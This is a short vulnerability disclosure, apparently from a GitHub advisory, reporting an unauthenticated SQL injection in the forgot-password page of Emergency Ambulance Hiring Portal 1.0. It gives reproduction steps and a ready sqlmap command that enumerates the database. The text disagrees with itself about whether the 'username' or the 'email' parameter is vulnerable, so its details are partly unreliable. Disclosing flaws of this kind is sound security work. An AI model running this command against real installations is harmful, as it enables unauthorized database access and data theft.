## Emergency Ambulance Hiring Portal 

**Bug Description:**

A vulnerability has been found in Emergency Ambulance Hiring Portal 1.0 and classified as critical. It has an SQL injection vulnerability in "/admin/forgot-password.php" endpoint. The manipulation of the parameter "username" leads to SQL injection. Remote attackers can leverage this vulnerability to manipulate a web application's SQL query by injecting malicious SQL code. This can lead to unauthorized access to databases, data theft, data manipulation, and other malicious activities.


Steps to Reproduce:

```
# Exploit Title: Unauthenticated SQL Injection in Forgot Password Page of Emergency Ambulance Hiring Portal 
# Date: 28-03-2024
# Exploit Author: dhabaleshwardas
# Vendor Homepage: https://phpgurukul.com/
# Software Link: https://phpgurukul.com/emergency-ambulance-hiring-portal-using-php-and-mysql/
# Version: 1.0
# Tested on: firefox/chrome/brave
# CVE:
```

To exploit the vulnerability:

1- First visit the admin login endpoint http://localhost/eahp/admin/forgot-password.php .

2- Capture the request after entering random "email" and "mobile number" and save it in a file. Then using the below command on SQLmap, we can fetch the databases as "email" parameter is vulnerable to SQL injection.

python sqlmap.py -r request.txt -p username --ignore-code 401 --level 5 --risk 2 --batch --dbs


<img width="763" alt="sqli forgot pass" src="https://github.com/dhabaleshwar/Open-Source-Vulnerabilities/assets/132373212/93b2e717-dc25-43b2-b7ed-ca525420a82a">
